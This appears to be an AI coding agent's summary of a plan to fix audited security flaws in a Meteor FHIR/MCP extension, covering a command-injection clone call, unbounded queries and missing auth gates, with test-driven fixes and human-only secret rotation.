- **Anchors verified against real code this session** (cwd-safe absolute paths): C1 interpolated clone at `methods.js:1502` + `execAsync` setup :1466-1468 + `check` :1452 + no pre-clone `userId` (first `this.userId` is post-clone :1536); C2 route handler `a2aJsonRpcRoute.js:79`, switch :116, `handleTasksGet` unbounded `findAsync({})` at `A2AServerFhir.js:347`; C4 all seven method line-numbers (:445/:670/:978/:1250/:1279/:1313/:2368) confirmed; H1 `requireAuth` :94-101 + export :521 + `configs/settings.synthea.json:144/:155`; H3 pubs :7/:26 `find({})` + admitted comment; `req.mcpUser` never threaded (`handleMessage` :36 has no identity param; tool handler :310 calls `searchFhirResources` :316 unscoped).
- **Corrected the audit's file reference:** `parseUserAuthorization` lives in the **parent** honeycomb `server/lib/FhirAuth.js` (exports :756-772) — `extensions/mcp` has **no** `server/lib/FhirAuth.js` (no such dir), so the gates import it via the app-root specifier `/server/lib/FhirAuth.js`.
- **Nested-repo commit discipline** is enforced in every task (Step 5 prepends `git rev-parse --show-toplevel` must end `/extensions/mcp`), matching the package-git-topology reality that `extensions/mcp` is its own repo force-added out of the monorepo.
- **Ordering matches the audit** (C1, then C2+C4, then H1, then C3-note+H3+H5); each finding is a TDD loop (failing security spec → fix per the audit's "Fix:" → prove-closed grep/test) and a single commit.
- **C3 stops for review** — only the narrower, mechanical auth-gate fixes ship; the architectural identity-threading refactor is a design note + human checkpoint, per instructions.
- **Secret rotation is HUMAN-ONLY** and called out separately; no credential is touched by any step.
- **Tests use the real harness** (`meteortesting:mocha`, `if (Meteor.isServer)`, `Meteor.server.method_handlers` / `publish_handlers` to invoke gated code directly) matching the existing `tests/a2a/protocol.test.js` style; live-HTTP asserts are marked skippable when the port isn't reachable so the load-bearing unit assertion still gates.
